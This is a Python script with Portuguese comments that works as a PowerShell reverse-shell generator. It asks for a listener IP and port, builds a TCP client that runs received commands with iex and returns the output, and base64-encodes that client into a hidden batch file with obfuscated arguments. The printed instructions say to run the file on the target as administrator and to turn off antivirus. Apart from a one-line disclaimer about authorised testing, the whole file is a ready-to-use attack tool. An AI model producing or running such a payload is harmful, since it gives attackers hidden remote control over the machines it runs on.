import base64
import random
from textwrap import dedent

def gerar_shell_reversa(ip, porta):
    # Código PowerShell funcional e testado
    codigo_ps = dedent(f"""\
    $client = New-Object System.Net.Sockets.TCPClient('{ip}',{porta})
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{{0}}
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
        $sendback = (iex $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }}
    $client.Close()""")

    # Codificação correta para UTF-16LE
    bytes_codigo = codigo_ps.encode('utf-16le')
    base64_codigo = base64.b64encode(bytes_codigo).decode('utf-8')

    # Ofuscação eficaz e funcional
    comando_batch = dedent(f"""\
    @echo off
    setlocal enabledelayedexpansion
    set "ps=powershell"
    set "arg1=-nop"
    set "arg2=-w"
    set "arg3=hidden"
    set "arg4=-enc"
    set "enc={base64_codigo}"
    chcp 65001 > nul
    %ps% !arg1! !arg2! !arg3! !arg4! !enc!
    endlocal
    """)

    return comando_batch

def testar_conexao(ip, porta):
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, int(porta)))
        s.close()
        return True
    except:
        return False

# Interface do usuário
print("""
╔════════════════════════════════════════════╗
║ GERADOR DE SHELL REVERSA - POWERSHELL      ║
╚════════════════════════════════════════════╝
""")

while True:
    ip = input("IP do listener (ex: 192.168.1.100): ").strip()
    porta = input("Porta do listener (ex: 4444): ").strip()
    
    if not ip or not porta:
        print("IP e porta são obrigatórios!")
        continue
        
    try:
        int(porta)
        if 1 <= int(porta) <= 65535:
            break
        else:
            print("Porta deve estar entre 1 e 65535!")
    except ValueError:
        print("Porta deve ser um número!")

# Teste de conexão
print("\nTestando conexão...")
if testar_conexao(ip, porta):
    print("✅ Porta acessível")
else:
    print("⚠️ Não foi possível conectar. Verifique:")
    print(f"1. IP {ip} está correto?")
    print(f"2. Porta {porta} está aberta?")
    print("3. Firewall/antivírus está bloqueando?")
    print("4. Você tem um listener ativo? (ex: nc -lvnp {porta})")

# Gera o payload
payload = gerar_shell_reversa(ip, porta)

# Salva em arquivo
nome_arquivo = f"shell_{ip}_{porta}.bat"
with open(nome_arquivo, 'w', encoding='utf-8') as f:
    f.write(payload)

print(f"\nPayload gerado em: {nome_arquivo}")
print("\nComo usar:")
print(f"1. No seu computador, execute: nc -lvnp {porta}")
print(f"2. Execute o arquivo {nome_arquivo} no alvo")
print("\nDicas importantes:")
print("- Execute como administrador se possível")
print("- Desative temporariamente o antivírus para testes")
print("- Para sair do listener, use Ctrl+C")
print("\n⚠️ Use apenas para testes legais e autorizados!")